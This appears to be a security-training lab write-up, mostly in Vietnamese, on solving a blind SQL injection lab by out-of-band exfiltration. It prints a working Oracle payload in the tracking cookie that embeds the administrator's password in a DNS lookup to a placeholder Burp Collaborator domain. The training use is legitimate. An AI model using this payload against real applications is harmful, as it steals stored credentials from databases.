# Lab: Blind SQL injection with out-of-band data exfiltration

**PRACTITIONER**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Write-up

Lab này mở rộng từ OOB interaction: không chỉ confirm SQLi mà phải exfiltrate luôn password qua DNS.

Em dùng payload ghép password vào subdomain rồi ép DB gọi ra Burp Collaborator:

TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)||'

Sau khi gửi request, vào Collaborator sẽ thấy DNS/HTTP interaction chứa phần password ở subdomain.

Copy password đó rồi đăng nhập administrator là solve lab.

Lab này mấu chốt là chuyển dữ liệu nhạy cảm ra ngoài qua kênh OOB thay vì đọc trực tiếp trên response.
